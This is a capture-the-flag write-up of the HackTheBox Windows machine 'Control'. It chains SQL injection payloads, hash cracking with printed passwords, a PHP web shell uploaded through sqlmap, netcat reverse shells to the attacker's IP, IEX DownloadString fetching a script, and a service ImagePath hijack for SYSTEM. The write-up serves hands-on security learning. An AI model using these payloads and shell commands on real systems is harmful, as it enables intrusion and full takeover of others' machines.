---
title: "Control - HackTheBox"
date: "2020-04-25"
tags: [HackTheBox, Windows, SQL Injection, ACL, Registry]
---

![](/images/hackthebox/control/info.png)
Control is a hard Windows machine from HackTheBox. We'll exploit a SQL injection
to get some credentials, upload a PHP file that will get us a reverse shell, use
the found credentials to escalate privileges and exploit a ACL to become
Administrator.

## Information gathering

As always let's start with a port scan:
```
$ nmap -A -T4 10.10.10.167
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-02 18:42 EST
Nmap scan report for 10.10.10.167
Host is up (0.45s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Fidelity
135/tcp  open  msrpc   Microsoft Windows RPC
3306/tcp open  mysql?
| fingerprint-strings:
|   FourOhFourRequest, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPSearchReq, LPDString, NULL:
|_    Host '10.10.14.81' is not allowed to connect to this MariaDB server
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.80%I=7%D=12/2%Time=5DE5A197%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.81'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(GenericLines
SF:,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.81'\x20is\x20not\x20allowed
SF:\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Kerberos,4A,"F
SF:\0\0\x01\xffj\x04Host\x20'10\.10\.14\.81'\x20is\x20not\x20allowed\x20to
SF:\x20connect\x20to\x20this\x20MariaDB\x20server")%r(FourOhFourRequest,4A
SF:,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.81'\x20is\x20not\x20allowed\x2
SF:0to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LPDString,4A,"F\0
SF:\0\x01\xffj\x04Host\x20'10\.10\.14\.81'\x20is\x20not\x20allowed\x20to\x
SF:20connect\x20to\x20this\x20MariaDB\x20server")%r(LDAPSearchReq,4A,"F\0\
SF:0\x01\xffj\x04Host\x20'10\.10\.14\.81'\x20is\x20not\x20allowed\x20to\x2
SF:0connect\x20to\x20this\x20MariaDB\x20server")%r(LANDesk-RC,4A,"F\0\0\x0
SF:1\xffj\x04Host\x20'10\.10\.14\.81'\x20is\x20not\x20allowed\x20to\x20con
SF:nect\x20to\x20this\x20MariaDB\x20server")%r(JavaRMI,4A,"F\0\0\x01\xffj\
SF:x04Host\x20'10\.10\.14\.81'\x20is\x20not\x20allowed\x20to\x20connect\x2
SF:0to\x20this\x20MariaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Ok so we have an HTTP server on port 80 and an exposed MySQL server, which,
however, we are not allowed to connect to as we can see from the message:
```
Host '10.10.14.81' is not allowed to connect to this MariaDB server
```

Let's check the HTTP server:
![](/images/hackthebox/control/web.png)

The login and admin links on the top navigation bar brings us both to
`/admin.php`, but there's an error message on the page:
![](/images/hackthebox/control/admin-error.png)

Proxies add `X-Forwarded-For` header to all requests to indicate which client
the request originated from, we could try to bruteforce the correct IP address
but we have no clue about the subnet.

There's not much more to do, except for a newsletter subscription form that does
not send data anywhere.

## Finding the IP for the proxy header
Inspecting the index source we can find a comment:
```html
<!-- To Do:
    - Import Products
    - Link to new payment system
    - Enable SSL (Certificates location \\192.168.4.28\myfiles)
<!-- Header -->
```

Looks like we have a subnet now! We can try to find a valid value for the
`X-Forwarded-For` header on `192.168.4.0/24`.

Let's write all the IP addresses in the subnet with `seq -f '192.168.4.%g' 1
255 > subnet.txt`

And now we can use [ffuf](https://github.com/ffuf/ffuf) to try them all:
```
$ ffuf -c -r -ac -w subnet.txt -H 'X-Forwarded-For: FUZZ' -u http://10.10.10.167/admin.php

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.167/admin.php
 :: Header           : X-Forwarded-For: FUZZ
 :: Follow redirects : true
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: 89
 :: Filter           : Response words: 15
________________________________________________

192.168.4.28            [Status: 200, Size: 7933, Words: 327, Lines: 154]
:: Progress: [255/255] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

The right IP address is the same one in the HTML comment! I guess I should have
tried it first.

Now we can visit the admin page by using Burp to add the header:
![](/images/hackthebox/control/proxy.png)

And here's the admin page:
![](/images/hackthebox/control/admin.png)

We can use the handy [Add Custom
Header](https://portswigger.net/bappstore/807907f5380c4cb38748ef4fc1d8cdbc)
plugin for Burp to automatically add the header on every request:
![](/images/hackthebox/control/plugin.png)

If we search product `'` we get a SQL error:
```
Error: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1
```

## Exploiting the SQL injection
Now let's search for `' or 1=1 #`
![](/images/hackthebox/control/sql-injection.png)

Looks like SQL injection to me! Trying to enumerate the number of columns in the
query we find out there are 6 with `test' UNION SELECT 1, 2, 3, 4, 5, 6 #`
![](/images/hackthebox/control/col-enum.png)

Let's find the database name with `test' UNION SELECT database(), 2, 3, 4, 5, 6
#`
![](/images/hackthebox/control/db-name.png)

And now let's find all the tables in the database with `test' UNION SELECT
GROUP_CONCAT(table_name), 2, 3, 4, 5, 6 FROM information_schema.tables where
table_schema='warehouse' #`
![](/images/hackthebox/control/tables.png)

It looks like there are only products tables. Let's make a step back. Let's see
if we can read MySQL users with `test' UNION SELECT user, password, 3, 4, 5, 6
FROM mysql.user #`
![](/images/hackthebox/control/dbms-users.png)

Cool! We have some hashes! Let's try to crack them with hashcat. I'm using the
rockyou wordlist and the `best64` rule set from hashcat: `hashcat -m 300 -a0 -r
/usr/share/hashcat/rules/best64.rule dbms-hashes.txt rockyou.txt`.

It will take a couple of seconds if you have a GPU. Let's see the results:
```
$ hashcat -m 300 -a0 dbms-hashes.txt --show
cfe3eee434b38cbf709ad67a4dcdea476cba7fda:l3tm3!n
0e178792e8fc304a2e3133d535d38caf1da3cd9d:l33th4x0rhector
```

We now have the password for `hector` and `manager` but we can't get a remote
shell as port 5985 is not open.


## Remote command execution
Here I was stuck for a bit but then I remembered that sqlmap has the
`--file-write` option that allows to upload files, and given that the server is
vulnerable to SQL injection we can use it!

Let's copy one of the requests body from Burp in a file called `post`:
```
POST /search_products.php HTTP/1.1
Host: 10.10.10.167
Content-Length: 28
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.10.167
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.10.167/admin.php
Accept-Encoding: gzip, deflate
Accept-Language: en,en-US;q=0.9,it-IT;q=0.8,it;q=0.7,la;q=0.6,fr;q=0.5
Connection: close
X-Forwarded-For: 192.168.4.28

productName=test
```

Let's write the simplest PHP shell:
```
<?php
    echo system($_GET['cmd']);
?>
```

And upload it:
```
$ sqlmap -r post --file-dest='C:\inetpub\wwwroot\shell.php' --file-write shell.php
```

Now we can run commands like:
```
$ curl 'http://10.10.10.167/shell.php?cmd=whoami'
nt authority\iusr
```

One interesting thing is that WinRM is listening on port 5985:
```
$ curl 'http://10.10.10.167/shell.php?cmd=netstat+-ano'

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       816
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1848
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       452
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       312
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       952
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1684
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       584
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       592
  TCP    10.10.10.167:80        10.10.14.81:47032      ESTABLISHED     4
  TCP    10.10.10.167:80        10.10.14.81:47298      CLOSE_WAIT      4
  TCP    10.10.10.167:80        10.10.14.81:47300      ESTABLISHED     4
  TCP    10.10.10.167:56686     10.10.14.81:1337       ESTABLISHED     4424
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       816
  TCP    [::]:3306              [::]:0                 LISTENING       1848
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       452
  TCP    [::]:49665             [::]:0                 LISTENING       312
  TCP    [::]:49666             [::]:0                 LISTENING       952
  TCP    [::]:49667             [::]:0                 LISTENING       1684
  TCP    [::]:49668             [::]:0                 LISTENING       584
  TCP    [::]:49669             [::]:0                 LISTENING       592
  UDP    0.0.0.0:123            *:*                                    1920
  UDP    0.0.0.0:5353           *:*                                    1208
  UDP    0.0.0.0:5355           *:*                                    1208
  UDP    0.0.0.0:58660          *:*                                    1208
  UDP    127.0.0.1:51281        *:*                                    952
  UDP    [::]:123               *:*                                    1920
  UDP    [::]:5353              *:*                                    1208
  UDP    [::]:5355              *:*                                    1208
  UDP    [::]:58660             *:*                                    1208
```

There's probably a firewall blocking external connections to it. A cool tool
that I found out while doing this machine is
[plink](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html), which
is basically PuTTY but command line. We can use it to forward the internal port
to our machine, but first we have to get a shell.

## Forwarding WinRM port using a SSH tunnel
Let's download [netcat](https://eternallybored.org/misc/netcat/) for Windows and
upload it using sqlmap again:
```
$ sqlmap -r post --file-dest='C:\inetpub\wwwroot\nc64.exe' --file-write nc64.exe
```

I just omitted the output as it's too long. If it looks stuck just give it some
time because the file is a bit big.

Now let's start a netcat listener on our machine with `nc -lnvp 1337` and let's
get a reverse shell by making a request to
`http://10.10.10.167/shell.php?cmd=nc64.exe+10.10.14.81+1337+-e+powershell.exe`:
```
$ nc -lnvp 1337                                                                                                                                                                                                                         
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.10.167.
Ncat: Connection from 10.10.10.167:50612.
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\wwwroot>
```

Now we can use this shell to execute `plink` and forward the WinRM port. Let's
upload `plink` with:
```
$ sqlmap -r post --file-dest='C:\inetpub\wwwroot\plink.exe' --file-write plink.exe
```

This one will really take a long time. One other thing that I could have done is
to download it using a HTTP server on my machine, and something like
`Invoke-WebRequest -Uri http://10.10.14.81:1338/plink.exe -OutFile plink.exe` in
the Temp directory, I guess I'm just being lazy.

Now let's forward the port, the syntax is basically the same as the `ssh` one:
```
PS C:\inetpub\wwwroot> ./plink.exe vagrant@10.10.14.81 -R 5985:127.0.0.1:5985
```

Be aware that you'll have to use your password, so I suggest changing it after
using it.

Now we can use the SSH tunnel to try the previously found credentials on WinRM:
```
$ evil-winrm -i localhost -u hector -p l33th4x0rhector

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Hector\Documents>
```

And we have a shell! Let's see we can read the flag:
```
*Evil-WinRM* PS C:\Users\Hector\Desktop> icacls user.txt
user.txt NT AUTHORITY\SYSTEM:(F)
         BUILTIN\Administrators:(F)
         CONTROL\Hector:(F)

Successfully processed 1 files; Failed processing 0 files
```

## Privilege escalation

This step took me multiple days because I don't know much about windows.

While enumerating I found the Powershell history:
```
*Evil-WinRM* PS C:\Users\Hector\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine> cat ConsoleHost_history.txt
get-childitem HKLM:\SYSTEM\CurrentControlset | format-list
get-acl HKLM:\SYSTEM\CurrentControlSet | format-list
```

So let's run those commands:
```
*Evil-WinRM* PS C:\Users\Hector\Documents> get-childitem HKLM:\SYSTEM\CurrentControlset | format-list

Property      : {BootDriverFlags, CurrentUser, EarlyStartServices, PreshutdownOrder...}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Control
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Control
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 121
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 11
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Control

Property      : {NextParentID.daba3ff.2, NextParentID.61aaa01.3, NextParentID.1bd7f811.4, NextParentID.2032e665.5...}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Enum
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Enum
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 17
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 27
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Enum

Property      : {}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Hardware Profiles
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Hardware Profiles
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 3
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 0
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Hardware Profiles

Property      : {}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Policies
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Policies
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 0
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 0
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Policies

Property      : {}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Services
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 667
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 0
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services

Property      : {}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Software
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Software
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 1
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 0
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Software
```

```
*Evil-WinRM* PS C:\Users\Hector\Documents> get-acl HKLM:\SYSTEM\CurrentControlSet | format-list

Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : BUILTIN\Administrators Allow  FullControl
         NT AUTHORITY\Authenticated Users Allow  ReadKey
         NT AUTHORITY\Authenticated Users Allow  -2147483648
         S-1-5-32-549 Allow  ReadKey
         S-1-5-32-549 Allow  -2147483648
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -2147483648
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  ReadKey
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  -2147483648
Audit  :
Sddl   : O:BAG:SYD:AI(A;;KA;;;BA)(A;ID;KR;;;AU)(A;CIIOID;GR;;;AU)(A;ID;KR;;;SO)(A;CIIOID;GR;;;SO)(A;ID;KA;;;BA)(A;CIIOID;GA;;;BA)(A;ID;KA;;;SY)(A;CIIOID;GA;;;SY)(A;CIIOID;GA;;;CO)(A;ID;KR;;;AC)(A;CIIOID;GR;;;AC)(A;ID;KR;;;S-1-15-3-1024-1065365936-12
         81604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)(A;CIIOID;GR;;;S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)
```

SDDL stands for Security Descriptor Definition Language and it's just a way to
define permissions.
[Here](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/convertfrom-sddlstring?view=powershell-7)
is the documentation page that explains how to convert it to a readable format.
Let' do `$acl = get-acl HKLM:\SYSTEM\CurrentControlSet\Services` and:
```
*Evil-WinRM* PS C:\Users\Hector\Documents> ConvertFrom-SddlString -Sddl $acl.Sddl -Type RegistryRights


Owner            : NT AUTHORITY\SYSTEM
Group            : NT AUTHORITY\SYSTEM
DiscretionaryAcl : {NT AUTHORITY\Authenticated Users: AccessAllowed (EnumerateSubKeys, ExecuteKey, Notify, QueryValues, ReadPermissions), NT AUTHORITY\SYSTEM: AccessAllowed (ChangePermissions, CreateLink, CreateSubKey, Delete, EnumerateSubKeys,
                   ExecuteKey, FullControl, GenericExecute, GenericWrite, Notify, QueryValues, ReadPermissions, SetValue, TakeOwnership, WriteKey), BUILTIN\Administrators: AccessAllowed (ChangePermissions, CreateLink, CreateSubKey, Delete,
                   EnumerateSubKeys, ExecuteKey, FullControl, GenericExecute, GenericWrite, Notify, QueryValues, ReadPermissions, SetValue, TakeOwnership, WriteKey), CONTROL\Hector: AccessAllowed (ChangePermissions, CreateLink, CreateSubKey,
                   Delete, EnumerateSubKeys, ExecuteKey, FullControl, GenericExecute, GenericWrite, Notify, QueryValues, ReadPermissions, SetValue, TakeOwnership, WriteKey)...}
SystemAcl        : {}
RawDescriptor    : System.Security.AccessControl.CommonSecurityDescriptor
```

As we can see, Hector has the FullControl permission set, so we can change
whatever we want in the registry.

Because I couldn't find the correct service to exploit, I just wrote a script
that tries them all (I know, it's not the correct way to go, I have no excuse
for that).

This is the script, I called it `brute.ps1`:
```ps1
$services = Get-ItemProperty HKLM:\System\CurrentControlset\Services\* | where { ($_.ObjectName -match 'LocalSystem') }

ForEach ($service in $services)
{
    $name = $service.PSChildName
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\$name" -Name ImagePath -Value "C:\inetpub\wwwroot\nc64.exe 10.10.14.81 1338 -e powershell.exe"
    Start-Service $name
}
```

It basically filters services running as Administrator and tries to change the
value for the `ImagePath` field to a netcat reverse shell.
Let's run it with `IEX (New-Object
Net.WebClient).DownloadString('http://10.10.14.81:1339/brute.ps1')`, and after a
second we should get a shell on our listener:
```
$ nc -lnvp 1338
listening on [any] 1338 ...
connect to [10.10.14.81] from (UNKNOWN) [10.10.10.167] 50422
Microsoft Windows [Version 10.0.17763.805]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

Let's check if we can read the flag:
```
C:\Windows\system32>icacls C:\Users\Administrator\Desktop\root.txt
C:\Users\Administrator\Desktop\root.txt NT AUTHORITY\SYSTEM:(I)(F)
                                        BUILTIN\Administrators:(I)(F)
                                        CONTROL\Administrator:(I)(F)

Successfully processed 1 files; Failed processing 0 files
```

Wow that was quite a journey.
Here are some articles that I found quite useful:
* [Windows Privilege Escalation — Insecure Service #1](https://medium.com/@shy327o/windows-privilege-escalation-insecure-service-1-ec4c428e4800)
* [Persistence - Modify Existing Service](https://pentestlab.blog/2020/01/22/persistence-modify-existing-service/)

I can't wait to see IppSec's writeup about this machine!
